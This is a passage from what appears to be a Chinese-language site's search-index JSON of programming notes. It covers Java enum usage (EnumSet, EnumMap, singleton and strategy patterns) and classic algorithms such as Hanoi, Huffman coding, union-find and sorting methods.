中引入，表示一种特殊类型的类，其总是继承java.lang.Enum类，更多内容可以自行查看其官方文档。\n枚举在很多时候会和常量拿来对比，可能因为本身我们大量实际使用枚举的地方就是为了替代常量。那么这种方式有什么优势呢？\n以这种方式定义的常量使代码更具可读性，允许进行编译时检查，预先记录可接受值的列表，并避免由于传入无效值而引起的意外行为。\n下面示例定义一个简单的枚举类型 pizza 订单的状态，共有三种 ORDERED, READY, DELIVERED状态:\npackage shuang.kou.enumdemo.enumtest; public enum PizzaStatus { ORDERED, READY, DELIVERED; } 简单来说，我们通过上面的代码避免了定义常量，我们将所有和 pizza 订单的状态的常量都统一放到了一个枚举类型里面。\nSystem.out.println(PizzaStatus.ORDERED.name());//ORDERED System.out.println(PizzaStatus.ORDERED);//ORDERED System.out.println(PizzaStatus.ORDERED.name().getClass());//class java.lang.String System.out.println(PizzaStatus.ORDERED.getClass());//class shuang.kou.enumdemo.enumtest.PizzaStatus 2.自定义枚举方法    现在我们对枚举是什么以及如何使用它们有了基本的了解，让我们通过在枚举上定义一些额外的API方法，将上一个示例提升到一个新的水平：\npublic class Pizza { private PizzaStatus status; public enum PizzaStatus { ORDERED, READY, DELIVERED; } public boolean isDeliverable() { return getStatus() == PizzaStatus.READY; } // Methods that set and get the status variable. } 3.使用 == 比较枚举类型    由于枚举类型确保JVM中仅存在一个常量实例，因此我们可以安全地使用 == 运算符比较两个变量，如上例所示；此外，== 运算符可提供编译时和运行时的安全性。\n首先，让我们看一下以下代码段中的运行时安全性，其中 == 运算符用于比较状态，并且如果两个值均为null 都不会引发 NullPointerException。相反，如果使用equals方法，将抛出 NullPointerException：\nPizza.PizzaStatus pizza = null; System.out.println(pizza.equals(Pizza.PizzaStatus.DELIVERED));//空指针异常 System.out.println(pizza == Pizza.PizzaStatus.DELIVERED);//正常运行 对于编译时安全性，我们看另一个示例，两个不同枚举类型进行比较：\nif (Pizza.PizzaStatus.DELIVERED.equals(TestColor.GREEN)); // 编译正常 if (Pizza.PizzaStatus.DELIVERED == TestColor.GREEN); // 编译失败，类型不匹配 4.在 switch 语句中使用枚举类型    public int getDeliveryTimeInDays() { switch (status) { case ORDERED: return 5; case READY: return 2; case DELIVERED: return 0; } return 0; } 5.枚举类型的属性,方法和构造函数     文末有我(JavaGuide)的补充。\n 你可以通过在枚举类型中定义属性,方法和构造函数让它变得更加强大。\n下面，让我们扩展上面的示例，实现从比萨的一个阶段到另一个阶段的过渡，并了解如何摆脱之前使用的if语句和switch语句：\npublic class Pizza { private PizzaStatus status; public enum PizzaStatus { ORDERED (5){ @Override public boolean isOrdered() { return true; } }, READY (2){ @Override public boolean isReady() { return true; } }, DELIVERED (0){ @Override public boolean isDelivered() { return true; } }; private int timeToDelivery; public boolean isOrdered() {return false;} public boolean isReady() {return false;} public boolean isDelivered(){return false;} public int getTimeToDelivery() { return timeToDelivery; } PizzaStatus (int timeToDelivery) { this.timeToDelivery = timeToDelivery; } } public boolean isDeliverable() { return this.status.isReady(); } public void printTimeToDeliver() { System.out.println(\u0026#34;Time to delivery is \u0026#34; + this.getStatus().getTimeToDelivery()); } // Methods that set and get the status variable. } 下面这段代码展示它是如何 work 的：\n@Test public void givenPizaOrder_whenReady_thenDeliverable() { Pizza testPz = new Pizza(); testPz.setStatus(Pizza.PizzaStatus.READY); assertTrue(testPz.isDeliverable()); } 6.EnumSet and EnumMap    6.1. EnumSet    EnumSet 是一种专门为枚举类型所设计的 Set 类型。\n与HashSet相比，由于使用了内部位向量表示，因此它是特定 Enum 常量集的非常有效且紧凑的表示形式。\n它提供了类型安全的替代方法，以替代传统的基于int的“位标志”，使我们能够编写更易读和易于维护的简洁代码。\nEnumSet 是抽象类，其有两个实现：RegularEnumSet 、JumboEnumSet，选择哪一个取决于实例化时枚举中常量的数量。\n在很多场景中的枚举常量集合操作（如：取子集、增加、删除、containsAll和removeAll批操作）使用EnumSet非常合适；如果需要迭代所有可能的常量则使用Enum.values()。\npublic class Pizza { private static EnumSet\u0026lt;PizzaStatus\u0026gt; undeliveredPizzaStatuses = EnumSet.of(PizzaStatus.ORDERED, PizzaStatus.READY); private PizzaStatus status; public enum PizzaStatus { ... } public boolean isDeliverable() { return this.status.isReady(); } public void printTimeToDeliver() { System.out.println(\u0026#34;Time to delivery is \u0026#34; + this.getStatus().getTimeToDelivery() + \u0026#34; days\u0026#34;); } public static List\u0026lt;Pizza\u0026gt; getAllUndeliveredPizzas(List\u0026lt;Pizza\u0026gt; input) { return input.stream().filter( (s) -\u0026gt; undeliveredPizzaStatuses.contains(s.getStatus())) .collect(Collectors.toList()); } public void deliver() { if (isDeliverable()) { PizzaDeliverySystemConfiguration.getInstance().getDeliveryStrategy() .deliver(this); this.setStatus(PizzaStatus.DELIVERED); } } // Methods that set and get the status variable. } 下面的测试展示了 EnumSet 在某些场景下的强大功能：\n@Test public void givenPizaOrders_whenRetrievingUnDeliveredPzs_thenCorrectlyRetrieved() { List\u0026lt;Pizza\u0026gt; pzList = new ArrayList\u0026lt;\u0026gt;(); Pizza pz1 = new Pizza(); pz1.setStatus(Pizza.PizzaStatus.DELIVERED); Pizza pz2 = new Pizza(); pz2.setStatus(Pizza.PizzaStatus.ORDERED); Pizza pz3 = new Pizza(); pz3.setStatus(Pizza.PizzaStatus.ORDERED); Pizza pz4 = new Pizza(); pz4.setStatus(Pizza.PizzaStatus.READY); pzList.add(pz1); pzList.add(pz2); pzList.add(pz3); pzList.add(pz4); List\u0026lt;Pizza\u0026gt; undeliveredPzs = Pizza.getAllUndeliveredPizzas(pzList); assertTrue(undeliveredPzs.size() == 3); } 6.2. EnumMap    EnumMap是一个专门化的映射实现，用于将枚举常量用作键。与对应的 HashMap 相比，它是一个高效紧凑的实现，并且在内部表示为一个数组:\nEnumMap\u0026lt;Pizza.PizzaStatus, Pizza\u0026gt; map; 让我们快速看一个真实的示例，该示例演示如何在实践中使用它：\nIterator\u0026lt;Pizza\u0026gt; iterator = pizzaList.iterator(); while (iterator.hasNext()) { Pizza pz = iterator.next(); PizzaStatus status = pz.getStatus(); if (pzByStatus.containsKey(status)) { pzByStatus.get(status).add(pz); } else { List\u0026lt;Pizza\u0026gt; newPzList = new ArrayList\u0026lt;\u0026gt;(); newPzList.add(pz); pzByStatus.put(status, newPzList); } } 下面的测试展示了 EnumMap 在某些场景下的强大功能：\n@Test public void givenPizaOrders_whenGroupByStatusCalled_thenCorrectlyGrouped() { List\u0026lt;Pizza\u0026gt; pzList = new ArrayList\u0026lt;\u0026gt;(); Pizza pz1 = new Pizza(); pz1.setStatus(Pizza.PizzaStatus.DELIVERED); Pizza pz2 = new Pizza(); pz2.setStatus(Pizza.PizzaStatus.ORDERED); Pizza pz3 = new Pizza(); pz3.setStatus(Pizza.PizzaStatus.ORDERED); Pizza pz4 = new Pizza(); pz4.setStatus(Pizza.PizzaStatus.READY); pzList.add(pz1); pzList.add(pz2); pzList.add(pz3); pzList.add(pz4); EnumMap\u0026lt;Pizza.PizzaStatus,List\u0026lt;Pizza\u0026gt;\u0026gt; map = Pizza.groupPizzaByStatus(pzList); assertTrue(map.get(Pizza.PizzaStatus.DELIVERED).size() == 1); assertTrue(map.get(Pizza.PizzaStatus.ORDERED).size() == 2); assertTrue(map.get(Pizza.PizzaStatus.READY).size() == 1); } 7. 通过枚举实现一些设计模式    7.1 单例模式    通常，使用类实现 Singleton 模式并非易事，枚举提供了一种实现单例的简便方法。\n《Effective Java 》和《Java与模式》都非常推荐这种方式，使用这种方式实现枚举可以有什么好处呢？\n《Effective Java》\n 这种方法在功能上与公有域方法相近，但是它更加简洁，无偿提供了序列化机制，绝对防止多次实例化，即使是在面对复杂序列化或者反射攻击的时候。虽然这种方法还没有广泛采用，但是单元素的枚举类型已经成为实现 Singleton的最佳方法。 —-《Effective Java 中文版 第二版》\n 《Java与模式》\n 《Java与模式》中，作者这样写道，使用枚举来实现单实例控制会更加简洁，而且无偿地提供了序列化机制，并由JVM从根本上提供保障，绝对防止多次实例化，是更简洁、高效、安全的实现单例的方式。\n 下面的代码段显示了如何使用枚举实现单例模式：\npublic enum PizzaDeliverySystemConfiguration { INSTANCE; PizzaDeliverySystemConfiguration() { // Initialization configuration which involves  // overriding defaults like delivery strategy  } private PizzaDeliveryStrategy deliveryStrategy = PizzaDeliveryStrategy.NORMAL; public static PizzaDeliverySystemConfiguration getInstance() { return INSTANCE; } public PizzaDeliveryStrategy getDeliveryStrategy() { return deliveryStrategy; } } 如何使用呢？请看下面的代码：\nPizzaDeliveryStrategy deliveryStrategy = PizzaDeliverySystemConfiguration.getInstance().getDeliveryStrategy(); 通过 PizzaDeliverySystemConfiguration.getInstance() 获取的就是单例的 PizzaDeliverySystemConfiguration\n7.2 策略模式    通常，策略模式由不同类实现同一个接口来实现的。\n这也就意味着添加新策略意味着添加新的实现类。使用枚举，可以轻松完成此任务，添加新的实现意味着只定义具有某个实现的另一个实例。\n下面的代码段显示了如何使用枚举实现策略模式：\npublic enum PizzaDeliveryStrategy { EXPRESS { @Override public void deliver(Pizza pz) { System.out.println(\u0026#34;Pizza will be delivered in express mode\u0026#34;); } }, NORMAL { @Override public void deliver(Pizza pz) { System.out.println(\u0026#34;Pizza will be delivered in normal mode\u0026#34;); } }; public abstract void deliver(Pizza pz); } 给 Pizza 增加下面的方法：\npublic void deliver() { if (isDeliverable()) { PizzaDeliverySystemConfiguration.getInstance().getDeliveryStrategy() .deliver(this); this.setStatus(PizzaStatus.DELIVERED); } } 如何使用呢？请看下面的代码：\n@Test public void givenPizaOrder_whenDelivered_thenPizzaGetsDeliveredAndStatusChanges() { Pizza pz = new Pizza(); pz.setStatus(Pizza.PizzaStatus.READY); pz.deliver(); assertTrue(pz.getStatus() == Pizza.PizzaStatus.DELIVERED); } 8. Java 8 与枚举    Pizza 类可以用Java 8重写，您可以看到方法 lambda 和Stream API如何使 getAllUndeliveredPizzas()和groupPizzaByStatus()方法变得如此简洁：\ngetAllUndeliveredPizzas():\npublic static List\u0026lt;Pizza\u0026gt; getAllUndeliveredPizzas(List\u0026lt;Pizza\u0026gt; input) { return input.stream().filter( (s) -\u0026gt; !deliveredPizzaStatuses.contains(s.getStatus())) .collect(Collectors.toList()); } groupPizzaByStatus() :\npublic static EnumMap\u0026lt;PizzaStatus, List\u0026lt;Pizza\u0026gt;\u0026gt; groupPizzaByStatus(List\u0026lt;Pizza\u0026gt; pzList) { EnumMap\u0026lt;PizzaStatus, List\u0026lt;Pizza\u0026gt;\u0026gt; map = pzList.stream().collect( Collectors.groupingBy(Pizza::getStatus, () -\u0026gt; new EnumMap\u0026lt;\u0026gt;(PizzaStatus.class), Collectors.toList())); return map; } 9. Enum 类型的 JSON 表现形式    使用Jackson库，可以将枚举类型的JSON表示为POJO。下面的代码段显示了可以用于同一目的的Jackson批注：\n@JsonFormat(shape = JsonFormat.Shape.OBJECT) public enum PizzaStatus { ORDERED (5){ @Override public boolean isOrdered() { return true; } }, READY (2){ @Override public boolean isReady() { return true; } }, DELIVERED (0){ @Override public boolean isDelivered() { return true; } }; private int timeToDelivery; public boolean isOrdered() {return false;} public boolean isReady() {return false;} public boolean isDelivered(){return false;} @JsonProperty(\u0026#34;timeToDelivery\u0026#34;) public int getTimeToDelivery() { return timeToDelivery; } private PizzaStatus (int timeToDelivery) { this.timeToDelivery = timeToDelivery; } } 我们可以按如下方式使用 Pizza 和 PizzaStatus：\nPizza pz = new Pizza(); pz.setStatus(Pizza.PizzaStatus.READY); System.out.println(Pizza.getJsonString(pz)); 生成 Pizza 状态以以下JSON展示：\n{ \u0026#34;status\u0026#34; : { \u0026#34;timeToDelivery\u0026#34; : 2, \u0026#34;ready\u0026#34; : true, \u0026#34;ordered\u0026#34; : false, \u0026#34;delivered\u0026#34; : false }, \u0026#34;deliverable\u0026#34; : true } 有关枚举类型的JSON序列化/反序列化（包括自定义）的更多信息，请参阅Jackson-将枚举序列化为JSON对象。\n10.总结    本文我们讨论了Java枚举类型，从基础知识到高级应用以及实际应用场景，让我们感受到枚举的强大功能。\n11. 补充    我们在上面讲到了，我们可以通过在枚举类型中定义属性,方法和构造函数让它变得更加强大。\n下面我通过一个实际的例子展示一下，当我们调用短信验证码的时候可能有几种不同的用途，我们在下面这样定义：\npublic enum PinType { REGISTER(100000, \u0026#34;注册使用\u0026#34;), FORGET_PASSWORD(100001, \u0026#34;忘记密码使用\u0026#34;), UPDATE_PHONE_NUMBER(100002, \u0026#34;更新手机号码使用\u0026#34;); private final int code; private final String message; PinType(int code, String message) { this.code = code; this.message = message; } public int getCode() { return code; } public String getMessage() { return message; } @Override public String toString() { return \u0026#34;PinType{\u0026#34; + \u0026#34;code=\u0026#34; + code + \u0026#34;, message=\u0026#39;\u0026#34; + message + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } 实际使用：\nSystem.out.println(PinType.FORGET_PASSWORD.getCode()); System.out.println(PinType.FORGET_PASSWORD.getMessage()); System.out.println(PinType.FORGET_PASSWORD.toString()); Output:\n100001 忘记密码使用 PinType{code=100001, message=\u0026#39;忘记密码使用\u0026#39;} 这样的话，在实际使用起来就会非常灵活方便！\n"},{"id":358,"href":"/%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95/","title":"算法","parent":"算法","content":"算法\n"},{"id":359,"href":"/%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E7%AE%97%E6%B3%95-%E5%85%B6%E5%AE%83/","title":"算法 - 其它","parent":"算法","content":"算法 - 其它    汉诺塔    \n有三个柱子，分别为 from、buffer、to。需要将 from 上的圆盘全部移动到 to 上，并且要保证小圆盘始终在大圆盘上。\n这是一个经典的递归问题，分为三步求解：\n① 将 n-1 个圆盘从 from -\u0026gt; buffer\n\n② 将 1 个圆盘从 from -\u0026gt; to\n\n③ 将 n-1 个圆盘从 buffer -\u0026gt; to\n\n如果只有一个圆盘，那么只需要进行一次移动操作。\n从上面的讨论可以知道，an = 2 * an-1 + 1，显然 an = 2n - 1，n 个圆盘需要移动 2n - 1 次。\npublic class Hanoi { public static void move(int n, String from, String buffer, String to) { if (n == 1) { System.out.println(\u0026#34;from \u0026#34; + from + \u0026#34; to \u0026#34; + to); return; } move(n - 1, from, to, buffer); move(1, from, buffer, to); move(n - 1, buffer, from, to); } public static void main(String[] args) { Hanoi.move(3, \u0026#34;H1\u0026#34;, \u0026#34;H2\u0026#34;, \u0026#34;H3\u0026#34;); } } from H1 to H3 from H1 to H2 from H3 to H2 from H1 to H3 from H2 to H1 from H2 to H3 from H1 to H3 哈夫曼编码    根据数据出现的频率对数据进行编码，从而压缩原始数据。\n例如对于一个文本文件，其中各种字符出现的次数如下：\n a : 10 b : 20 c : 40 d : 80  可以将每种字符转换成二进制编码，例如将 a 转换为 00，b 转换为 01，c 转换为 10，d 转换为 11。这是最简单的一种编码方式，没有考虑各个字符的权值（出现频率）。而哈夫曼编码采用了贪心策略，使出现频率最高的字符的编码最短，从而保证整体的编码长度最短。\n首先生成一颗哈夫曼树，每次生成过程中选取频率最少的两个节点，生成一个新节点作为它们的父节点，并且新节点的频率为两个节点的和。选取频率最少的原因是，生成过程使得先选取的节点位于树的更低层，那么需要的编码长度更长，频率更少可以使得总编码长度更少。\n生成编码时，从根节点出发，向左遍历则添加二进制位 0，向右则添加二进制位 1，直到遍历到叶子节点，叶子节点代表的字符的编码就是这个路径编码。\n\npublic class Huffman { private class Node implements Comparable\u0026lt;Node\u0026gt; { char ch; int freq; boolean isLeaf; Node left, right; public Node(char ch, int freq) { this.ch = ch; this.freq = freq; isLeaf = true; } public Node(Node left, Node right, int freq) { this.left = left; this.right = right; this.freq = freq; isLeaf = false; } @Override public int compareTo(Node o) { return this.freq - o.freq; } } public Map\u0026lt;Character, String\u0026gt; encode(Map\u0026lt;Character, Integer\u0026gt; frequencyForChar) { PriorityQueue\u0026lt;Node\u0026gt; priorityQueue = new PriorityQueue\u0026lt;\u0026gt;(); for (Character c : frequencyForChar.keySet()) { priorityQueue.add(new Node(c, frequencyForChar.get(c))); } while (priorityQueue.size() != 1) { Node node1 = priorityQueue.poll(); Node node2 = priorityQueue.poll(); priorityQueue.add(new Node(node1, node2, node1.freq + node2.freq)); } return encode(priorityQueue.poll()); } private Map\u0026lt;Character, String\u0026gt; encode(Node root) { Map\u0026lt;Character, String\u0026gt; encodingForChar = new HashMap\u0026lt;\u0026gt;(); encode(root, \u0026#34;\u0026#34;, encodingForChar); return encodingForChar; } private void encode(Node node, String encoding, Map\u0026lt;Character, String\u0026gt; encodingForChar) { if (node.isLeaf) { encodingForChar.put(node.ch, encoding); return; } encode(node.left, encoding + \u0026#39;0\u0026#39;, encodingForChar); encode(node.right, encoding + \u0026#39;1\u0026#39;, encodingForChar); } } "},{"id":360,"href":"/%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E7%AE%97%E6%B3%95-%E5%B9%B6%E6%9F%A5%E9%9B%86/","title":"算法 - 并查集","parent":"算法","content":"算法 - 并查集     算法 - 并查集  前言 Quick Find Quick Union 加权 Quick Union 路径压缩的加权 Quick Union 比较    前言    用于解决动态连通性问题，能动态连接两个点，并且判断两个点是否连通。\n\n   方法 描述     UF(int N) 构造一个大小为 N 的并查集   void union(int p, int q) 连接 p 和 q 节点   int find(int p) 查找 p 所在的连通分量编号   boolean connected(int p, int q) 判断 p 和 q 节点是否连通    public abstract class UF { protected int[] id; public UF(int N) { id = new int[N]; for (int i = 0; i \u0026lt; N; i++) { id[i] = i; } } public boolean connected(int p, int q) { return find(p) == find(q); } public abstract int find(int p); public abstract void union(int p, int q); } Quick Find    可以快速进行 find 操作，也就是可以快速判断两个节点是否连通。\n需要保证同一连通分量的所有节点的 id 值相等，就可以通过判断两个节点的 id 值是否相等从而判断其连通性。\n但是 union 操作代价却很高，需要将其中一个连通分量中的所有节点 id 值都修改为另一个节点的 id 值。\n\npublic class QuickFindUF extends UF { public QuickFindUF(int N) { super(N); } @Override public int find(int p) { return id[p]; } @Override public void union(int p, int q) { int pID = find(p); int qID = find(q); if (pID == qID) { return; } for (int i = 0; i \u0026lt; id.length; i++) { if (id[i] == pID) { id[i] = qID; } } } } Quick Union    可以快速进行 union 操作，只需要修改一个节点的 id 值即可。\n但是 find 操作开销很大，因为同一个连通分量的节点 id 值不同，id 值只是用来指向另一个节点。因此需要一直向上查找操作，直到找到最上层的节点。\n\npublic class QuickUnionUF extends UF { public QuickUnionUF(int N) { super(N); } @Override public int find(int p) { while (p != id[p]) { p = id[p]; } return p; } @Override public void union(int p, int q) { int pRoot = find(p); int qRoot = find(q); if (pRoot != qRoot) { id[pRoot] = qRoot; } } } 这种方法可以快速进行 union 操作，但是 find 操作和树高成正比，最坏的情况下树的高度为节点的数目。\n\n加权 Quick Union    为了解决 quick-union 的树通常会很高的问题，加权 quick-union 在 union 操作时会让较小的树连接较大的树上面。\n理论研究证明，加权 quick-union 算法构造的树深度最多不超过 logN。\n\npublic class WeightedQuickUnionUF extends UF { // 保存节点的数量信息  private int[] sz; public WeightedQuickUnionUF(int N) { super(N); this.sz = new int[N]; for (int i = 0; i \u0026lt; N; i++) { this.sz[i] = 1; } } @Override public int find(int p) { while (p != id[p]) { p = id[p]; } return p; } @Override public void union(int p, int q) { int i = find(p); int j = find(q); if (i == j) return; if (sz[i] \u0026lt; sz[j]) { id[i] = j; sz[j] += sz[i]; } else { id[j] = i; sz[i] += sz[j]; } } } 路径压缩的加权 Quick Union    在检查节点的同时将它们直接链接到根节点，只需要在 find 中添加一个循环即可。\n比较       算法 union find     Quick Find N 1   Quick Union 树高 树高   加权 Quick Union logN logN   路径压缩的加权 Quick Union 非常接近 1 非常接近 1    "},{"id":361,"href":"/%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F/","title":"算法 - 排序","parent":"算法","content":"算法 - 排序    约定    待排序的元素需要实现 Java 的 Comparable 接口，该接口有 compareTo() 方法，可以用它来判断两个元素的大小关系。\n使用辅助函数 less() 和 swap() 来进行比较和交换的操作，使得代码的可读性和可移植性更好。\n排序算法的成本模型是比较和交换的次数。\npublic abstract class Sort\u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; { public abstract void sort(T[] nums); protected boolean less(T v, T w) { return v.compareTo(w) \u0026lt; 0; } protected void swap(T[] a, int i, int j) { T t = a[i]; a[i] = a[j]; a[j] = t; } } 选择排序    从数组中选择最小元素，将它与数组的第一个元素交换位置。再从数组剩下的元素中选择出最小的元素，将它与数组的第二个元素交换位置。不断进行这样的操作，直到将整个数组排序。\n选择排序需要 ~N2/2 次比较和 ~N 次交换，它的运行时间与输入无关，这个特点使得它对一个已经排序的数组也需要这么多的比较和交换操作。\n\npublic class Selection\u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; extends Sort\u0026lt;T\u0026gt; { @Override public void sort(T[] nums) { int N = nums.length; for (int i = 0; i \u0026lt; N - 1; i++) { int min = i; for (int j = i + 1; j \u0026lt; N; j++) { if (less(nums[j], nums[min])) { min = j; } } swap(nums, i, min); } } } 冒泡排序    从左到右不断交换相邻逆序的元素，在一轮的循环之后，可以让未排序的最大元素上浮到右侧。\n在一轮循环中，如果没有发生交换，那么说明数组已经是有序的，此时可以直接退出。\n\npublic class Bubble\u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; extends Sort\u0026lt;T\u0026gt; { @Override public void sort(T[] nums) { int N = nums.length; boolean isSorted = false; for (int i = N - 1; i \u0026gt; 0 \u0026amp;\u0026amp; !isSorted; i--) { isSorted = true; for (int j = 0; j \u0026lt; i; j++) { if (less(nums[j + 1], nums[j])) { isSorted = false; swap(nums, j, j + 1); } } } } } 插入排序    每次都将当前元素插入到左侧已经排序的数组中，使得插入之后左侧数组依然有序。\n对于数组 {3, 5, 2, 4, 1}，它具有以下逆序：(3, 2), (3, 1), (5, 2), (5, 4), (5, 1), (2, 1), (4, 1)，插入排序每次只能交换相邻元素，令逆序数量减少 1，因此插入排序需要交换的次数为逆序数量。\n插入排序的时间复杂度取决于数组的初始顺序，如果数组已经部分有序了，那么逆序较少，需要的交换次数也就较少，时间复杂度较低。\n 平均情况下插入排序需要 ~N2/4 比较以及 ~N2/4 次交换； 最坏的情况下需要 ~N2/2 比较以及 ~N2/2 次交换，最坏的情况是数组是倒序的； 最好的情况下需要 N-1 次比较和 0 次交换，最好的情况就是数组已经有序了。  \npublic class Insertion\u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; extends Sort\u0026lt;T\u0026gt; { @Override public void sort(T[] nums) { int N = nums.length; for (int i = 1; i \u0026lt; N; i++) { for (int j = i; j \u0026gt; 0 \u0026amp;\u0026amp; less(nums[j], nums[j - 1]); j--) { swap(nums, j, j - 1); } } } } 希尔排序    对于大规模的数组，插入排序很慢，因为它只能交换相邻的元素，每次只能将逆序数量减少 1。希尔排序的出现就是为了解决插入排序的这种局限性，它通过交换不相邻的元素，每次可以将逆序数量减少大于 1。\n希尔排序使用插入排序对间隔 h 的序列进行排序。通过不断减小 h，最后令 h=1，就可以使得整个数组是有序的。\n\npublic class Shell\u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; extends Sort\u0026lt;T\u0026gt; { @Override public void sort(T[] nums) { int N = nums.length; int h = 1; while (h \u0026lt; N / 3) { h = 3 * h + 1; // 1, 4, 13, 40, ...  } while (h \u0026gt;= 1) { for (int i = h; i \u0026lt; N; i++) { for (int j = i; j \u0026gt;= h \u0026amp;\u0026amp; less(nums[j], nums[j - h]); j -= h) { swap(nums, j, j - h); } } h = h / 3; } } } 希尔排序的运行时间达不到平方级别，使用递增序列 1, 4, 13, 40, \u0026hellip; 的希尔排序所需要的比较次数不会超过 N 的若干倍乘于递增序列的长度。后面介绍的高级排序算法只会比希尔排序快两倍左右。\n归并排序    归并排序的思想是将数组分成两部分，分别进行排序，然后归并起来。\n\n1. 归并方法    归并方法将数组中两个已经排序的部分归并成一个。\npublic abstract class MergeSort\u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; extends Sort\u0026lt;T\u0026gt; { protected T[] aux; protected void merge(T[] nums, int l, int m, int h) { int i = l, j = m + 1; for (int k = l; k \u0026lt;= h; k++) { aux[k] = nums[k]; // 将数据复制到辅助数组  } for (int k = l; k \u0026lt;= h; k++) { if (i \u0026gt; m) { nums[k] = aux[j++]; } else if (j \u0026gt; h) { nums[k] = aux[i++]; } else if (aux[i].compareTo(aux[j]) \u0026lt;= 0) { nums[k] = aux[i++]; // 先进行这一步，保证稳定性  } else { nums[k] = aux[j++]; } } } } 2. 自顶向下归并排序    将一个大数组分成两个小数组去求解。\n因为每次都将问题对半分成两个子问题，这种对半分的算法复杂度一般为 O(NlogN)。\npublic class Up2DownMergeSort\u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; extends MergeSort\u0026lt;T\u0026gt; { @Override public void sort(T[] nums) { aux = (T[]) new Comparable[nums.length]; sort(nums, 0, nums.length - 1); } private void sort(T[] nums, int l, int h) { if (h \u0026lt;= l) { return; } int mid = l + (h - l) / 2; sort(nums, l, mid); sort(nums, mid + 1, h); merge(nums, l, mid, h); } } 3. 自底向上归并排序    先归并那些微型数组，然后成对归并得到的微型数组。\npublic class Down2UpMergeSort\u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; extends MergeSort\u0026lt;T\u0026gt; { @Override public void sort(T[] nums) { int N = nums.length; aux = (T[]) new Comparable[N]; for (int sz = 1; sz \u0026lt; N; sz += sz) { for (int lo = 0; lo \u0026lt; N - sz; lo += sz + sz) { merge(nums, lo, lo + sz - 1, Math.min(lo + sz + sz - 1, N - 1)); } } } } 快速排序    1. 基本算法     归并排序将数组分为两个子数组分别排序，并将有序的子数组归并使得整个数组排序； 快速排序通过一个切分元素将数组分为两个子数组，左子数组小于等于切分元素，右子数组大于等于切分元素，将这两个子数组排序也就将整个数组排序了。  \npublic class QuickSort\u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; extends Sort\u0026lt;T\u0026gt; { @Override public void sort(T[] nums) { shuffle(nums); sort(nums, 0, nums.length - 1); } private void sort(T[] nums, int l, int h) { if (h \u0026lt;= l) return; int j = partition(nums, l, h); sort(nums, l, j - 1); sort(nums, j + 1, h); } private void shuffle(T[] nums) { List\u0026lt;Comparable\u0026gt; list = Arrays.asList(nums); Collections.shuffle(list); list.toArray(nums); } } 2. 切分    取 a[l] 作为切分元素，然后从数组的左端向右扫描直到找到第一个大于等于它的元素，再从数组的右端向左扫描找到第一个小于它的元素，交换这两个元素。不断进行这个过程，就可以保证左指针 i 的左侧元素都不大于切分元素，右指针 j 的右侧元素都不小于切分元素。当两个指针相遇时，将切分元素 a[l] 和 a[j] 交换位置。\n\nprivate int partition(T[] nums, int l, int h) { int i = l, j = h + 1; T v = nums[l]; while (true) { while (less(nums[++i], v) \u0026amp;\u0026amp; i != h) ; while (less(v, nums[--j]) \u0026amp;\u0026amp; j != l) ; if (i \u0026gt;= j) break; swap(nums, i, j); } swap(nums, l, j); return j; } 3. 性能分析    快速排序是原地排序，不需要辅助数组，但是递归调用需要辅助栈。\n快速排序最好的情况下是每次都正好将数组对半分，这样递归调用次数才是最少的。这种情况下比较次数为 CN=2CN/2+N，复杂度为 O(NlogN)。\n最坏的情况下，第一次从最小的元素切分，第二次从第二小的元素切分，如此这般。因此最坏的情况下需要比较 N2/2。为了防止数组最开始就是有序的，在进行快速排序时需要随机打乱数组。\n4. 算法改进    4.1 切换到插入排序    因为快速排序在小数组中也会递归调用自己，对于小数组，插入排序比快速排序的性能更好，因此在小数组中可以切换到插入排序。\n4.2 三数取中    最好的情况下是每次都能取数组的中位数作为切分元素，但是计算中位数的代价很高。一种折中方法是取 3 个元素，并将大小居中的元素作为切分元素。\n4.3 三向切分    对于有大量重复元素的数组，可以将数组切分为三部分，分别对应小于、等于和大于切分元素。\n三向切分快速排序对于有大量重复元素的随机数组可以在线性时间内完成排序。\npublic class ThreeWayQuickSort\u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; extends QuickSort\u0026lt;T\u0026gt; { @Override protected void sort(T[] nums, int l, int h) { if (h \u0026lt;= l) { return; } int lt = l, i = l + 1, gt = h; T v = nums[l]; while (i \u0026lt;= gt) { int cmp = nums[i].compareTo(v); if (cmp \u0026lt; 0) { swap(nums, lt++, i++); } else if (cmp \u0026gt; 0) { swap(nums, i, gt--); } else { i++; } } sort(nums, l, lt - 1); sort(nums, gt + 1, h); } } 5. 基于切分的快速选择算法    快速排序的 partition() 方法，会返回一个整数 j 使得 a[l..j-1] 小于等于 a[j]，且 a[j+1..h] 大于等于 a[j]，此时 a[j] 就是数组的第 j 大元素。\n可以利用这个特性找出数组的第 k 个元素。\n该算法是线性级别的，假设每次能将数组二分，那么比较的总次数为 (N+N/2+N/4+..)，直到找到第 k 个元素，这个和显然小于 2N。\npublic T select(T[] nums, int k) { int l = 0, h = nums.length - 1; while (h \u0026gt; l) { int j = partition(nums, l, h); if (j == k) { return nums[k]; } else if (j \u0026gt; k) { h = j - 1; } else { l = j + 1; } } return nums[k]; } 堆排序    1. 堆    堆中某个节点的值总是大于等于或小于等于其子节点的值，并且堆是一颗完全二叉树。\n堆可以用数组来表示，这是因为堆是完全二叉树，而完全二叉树很容易就存储在数组中。位置 k 的节点的父节点位置为 k/2，而它的两个子节点的位置分别为 2k 和 2k+1。这里不使用数组索引为 0 的位置，是为了更清晰地描述节点的位置关系。\n\npublic class Heap\u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; { private T[] heap; private int N = 0; public 